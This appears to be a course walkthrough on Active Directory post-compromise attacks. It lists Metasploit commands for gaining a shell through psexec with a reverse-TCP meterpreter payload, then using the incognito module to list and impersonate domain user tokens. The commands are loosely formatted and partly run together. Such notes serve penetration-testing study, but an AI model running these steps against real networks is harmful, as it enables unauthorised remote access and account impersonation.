# Walkthrough

Many tools can be used for impersonation, we will use the incognito this time
Start msfconsole
- msfconsoleuse 
- use exploit/windows/smb/psexeccheck for option
- show optionsSet payload to x64
- set payload windows/x64/meterpreter/reverse_tcpSet other componets like rhost lhost etc
run options again to check if everything okay
Run the exploit
- run
Following can do for proof of concept

![Screenshot](./assets/160_Walkthrough_1cad64c5-e0cb-8087-be37-f0986c1cb587.png)

To start incognito 
- load incognitoUse help to check for more commands 
- helpTh last thing that will show up will be the incognito commands 

![Screenshot](./assets/161_Walkthrough_1cad64c5-e0cb-803e-adfc-d353e205522c.png)

to list user tokens
- list_tokens -uto list grp tokens
- list_tokens -g
To impersonate user 
- impersonate_token <domain>//<username>(Need 2 back slashes {/} for character escaping )

How to knw for sure that impersonation was successful
Use shell > whoami

![Screenshot](./assets/162_Walkthrough_1cad64c5-e0cb-8036-ba1f-ef2b0f8726b6.png)

after exiting cam use rev2self to get bck to where you were

Can use this as a proof of concept as well

![Screenshot](./assets/163_Walkthrough_1cad64c5-e0cb-80a6-9e65-dfd4955824db.png)


![Screenshot](./assets/164_Walkthrough_1cad64c5-e0cb-80e5-964e-e1b7933055c7.png)


---
[Back to Attacking Active Directory: Post-Compromise Attacks ](./README.md)
